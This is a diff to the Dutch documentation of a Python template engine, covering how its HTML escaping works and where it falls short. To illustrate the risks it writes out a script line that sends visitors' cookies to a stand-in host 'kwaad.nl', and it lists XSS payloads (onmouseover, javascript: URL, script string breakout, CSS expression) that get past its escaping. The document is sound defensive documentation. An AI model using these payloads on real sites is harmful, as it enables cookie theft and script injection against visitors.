@@ -85,14 +85,43 @@ Gewone methodes komen er níét doorheen. `{=items}` op een dict levert geen
 
 ## Escaping
 
-Substituties worden ge-escaped. Je template is HTML; je data is dat niet.
+Escaping vervangt vijf tekens die in HTML een betekenis hebben door hun entiteit:
 
-```python
->>> Ovotemplate("{=v}").render({"v": '<script>alert(1)</script>'})
-'&lt;script&gt;alert(1)&lt;/script&gt;'
+```
+'&' -> '&amp;'    '<' -> '&lt;'    '>' -> '&gt;'    '"' -> '&quot;'    "'" -> '&#x27;'
 ```
 
-Drie manieren om er bewust omheen te gaan, van fijnmazig naar grofmazig:
+Dat gebeurt alleen op waarden die via `{=naam}` uit je context komen, nooit op de
+letterlijke tekst van je template. De `&euro;` die je zelf typt blijft `&euro;`.
+
+### Waarom
+
+Een browser kan niet zien welke `<` jij hebt geschreven en welke uit je database
+kwam. Alles wat in de HTML-stroom terechtkomt is markup:
+
+```
+autoescape uit  <p>opmerking: <script>fetch("http://kwaad.nl?c="+document.cookie)</script></p>
+autoescape aan  <p>opmerking: &lt;script&gt;fetch(&quot;...&quot;)&lt;/script&gt;</p>
+```
+
+Zonder escaping heeft degene die dat opmerkingenveld invulde code op jouw pagina
+laten draaien, met de cookies van je bezoekers erbij. Mét escaping ziet de
+bezoeker gewoon de letterlijke tekst staan — entiteiten worden bij het tónen weer
+gedecodeerd, dus visueel verandert er niets.
+
+De ampersand is het subtielere geval, en gaat niet over veiligheid maar over
+correctheid. Een browser leest een losse `&` als het begin van een entiteit:
+
+```
+?p=1&copy=2     wordt gelezen als  ?p=1©=2
+?p=1&sect=3     wordt gelezen als  ?p=1§=3
+?p=1&pagina=2   gaat toevallig goed
+```
+
+Een URL met `&copy=` in een `href` is dus stuk zonder escaping. Met `&amp;` klopt
+het altijd, ongeacht wat erachter staat.
+
+### Eromheen, als je markup wél wilt doorlaten
 
 ```python
 Ovotemplate("{=!v}").render({"v": markup})     # deze ene substitutie
@@ -100,9 +129,54 @@ Ovotemplate("{=v}").render({"v": Raw(markup)}) # deze ene waarde, overal
 ovotemplate.autoescape = False                 # helemaal uit
 ```
 
-Letterlijke tekst in de template blijft ongemoeid — `&euro;` blijft `&euro;` —
-en een `{:setter}` legt zijn opgevangen markup vast als `Raw`, zodat
-`{:x <b>{=v}</b>}{=x}` niet dubbel escapet.
+Een `{:setter}` hoef je niet apart te regelen: die legt zijn opgevangen tekst
+vast als `Raw`, dus `{:x <b>{=v}</b>}{=x}` escapet alleen de `{=v}` daarbinnen en
+laat de `<b>` die jij schreef met rust.
+
+## Wat escaping niet doet
+
+Ovotemplate kent één escaping-regel en weet niet in wat voor context een
+substitutie terechtkomt. Dat is genoeg voor tekstinhoud en voor attribuutwaarden
+tussen aanhalingstekens:
+
+```html
+<p>{=v}</p>             <!-- veilig -->
+<div class="{=v}">      <!-- veilig -->
+```
+
+Maar niet voor deze vier. Allemaal gemeten, allemaal met escaping aan:
+
+```html
+<div class={=v}>              v = 'a onmouseover=alert(1)'
+                              -> <div class=a onmouseover=alert(1)>
+
+<a href="{=v}">               v = 'javascript:alert(1)'
+                              -> <a href="javascript:alert(1)">
+
+<script>var x = "{=v}";       v = '\'
+                              -> var x = "\";   (breekt uit de string)
+
+<div style="{=v}">            v = 'x:expression(alert(1))'
+                              -> ongewijzigd doorgegeven
+```
+
+Geen van die vier bevat een van de vijf tekens die geëscaped worden. Zet
+attribuutwaarden dus altijd tussen aanhalingstekens, en behandel URL's, `<script>`
+en `<style>` als plekken waar je contextdata zelf moet valideren.
+
+Twee dingen daarnaast, die los van escaping staan:
+
+- `{$file}` en `{$verb}` openen elk pad dat uit de template rolt, inclusief een
+  pad dat via `{=naam}` uit je context komt. `{$verb {=pad}}` met een
+  context-gestuurde `pad` is dus willekeurige bestandstoegang.
+- De templatenaam komt ongeëscaped in foutmeldingen terecht. Alleen van belang
+  als die naam uit een verzoek kan komen, bijvoorbeeld via `acquire()` met
+  padelementen uit een URL.
+
+Kortom: escaping sluit de meest voorkomende deur — data die als tekst in HTML
+belandt — maar maakt de engine niet vanzelf veilig. Contextbewuste escaping,
+zoals Jinja2 die met zijn autoescape-per-context ook niet heeft, zou daarvoor
+nodig zijn.
 
 ## Onbekende variabelen
 
